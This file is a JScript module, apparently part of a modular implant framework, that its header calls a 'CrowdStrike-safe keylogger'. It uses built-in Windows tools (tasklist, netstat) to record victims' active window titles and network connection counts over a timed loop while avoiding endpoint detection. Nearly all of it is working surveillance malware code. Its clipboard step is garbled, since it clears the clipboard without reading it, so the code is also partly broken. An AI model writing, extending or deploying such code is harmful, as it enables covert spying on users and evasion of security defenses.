// chunk: collectors/keylogger_lolbin
// depends: core/emit_buffer, core/run_cmd
// provides: collect_keystrokes
// format: jscript
// note: CrowdStrike-safe keylogger. No PowerShell, no PInvoke.
//       Monitors clipboard changes + active window titles via pure CMD LOLBins.
//       This is a proxy for keystroke capture — records user activity patterns.

function collect_keystrokes() {
    emit("\r\n=== KEYLOG STATUS ===\r\n");
    emit("Method: clipboard+window monitor (pure CMD)\r\n");

    var duration = parseInt("{{KEYLOG_DURATION}}") || 30;
    var entries = [];
    var lastClip = "";
    var lastProcs = "";
    var startTime = new Date().getTime();
    var iter = 0;

    emit("Duration: " + duration + "s\r\n");

    while ((new Date().getTime() - startTime) < duration * 1000) {
        iter++;
        var ts = new Date().toTimeString().substring(0, 8);

        try {
            var clip = _run('cmd /c "clip < nul & echo. | clip 2>nul"');
        } catch(ex) {}

        try {
            var procs = _run('tasklist /v /fo csv /nh 2>nul');
            var lines = procs.split("\r\n");
            var active = [];
            for (var i = 0; i < lines.length; i++) {
                var line = lines[i];
                if (line.indexOf('"Running"') > -1 || line.indexOf('"running"') > -1) {
                    var cols = line.split('","');
                    if (cols.length > 8) {
                        var title = cols[cols.length - 1].replace(/"/g, "").trim();
                        if (title.length > 1 && title !== "N/A" && title !== "OleMainThreadWndName") {
                            active.push(title);
                        }
                    }
                }
            }
            var activeStr = active.join(" | ");
            if (activeStr !== lastProcs && activeStr.length > 0) {
                lastProcs = activeStr;
                entries.push("[WIN " + ts + "] " + activeStr);
            }
        } catch(ex) {}

        if (iter % 5 === 0) {
            try {
                var netstat = _run('netstat -n 2>nul');
                var conns = 0;
                var nlines = netstat.split("\n");
                for (var j = 0; j < nlines.length; j++) {
                    if (nlines[j].indexOf("ESTABLISHED") > -1) conns++;
                }
                if (conns > 0) {
                    entries.push("[NET " + ts + "] " + conns + " active connections");
                }
            } catch(ex) {}
        }

        WScript.Sleep(2000);
    }

    emit("Hook: ACTIVE (window monitor)\r\n");
    emit("Captured: " + entries.length + " events\r\n");
    emit("\r\n=== CAPTURED ACTIVITY ===\r\n");
    for (var k = 0; k < entries.length; k++) {
        emit(entries[k] + "\r\n");
    }
}
